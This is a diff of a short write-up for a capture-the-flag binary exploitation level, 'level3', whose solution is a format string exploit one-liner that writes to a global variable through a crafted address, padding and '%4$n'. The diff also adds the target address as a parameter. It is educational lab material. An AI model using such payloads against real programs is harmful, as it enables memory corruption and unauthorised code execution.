@@ -17,7 +17,7 @@ the printf call use the format string contained in the buffer, leading to a form
 
 ### SOLUTION
 ``` bash
-(python -c 'print("[m global addr]" +"a"*60+ "%4$n")'; cat -) | ./level3
+(python -c 'print("m_global_addr" +"a"*60+ "%4$n")'; cat -) | ./level3
 ```
 
 ### COMMAND EXPLANATION
@@ -32,4 +32,6 @@ the printf call use the format string contained in the buffer, leading to a form
 
 - `()` : the scope to execute the command `cat` with result of `python`
 
+## USED PARAMETERS
 
+`m_global_addr` = `\xf4\x84\x04\x08`
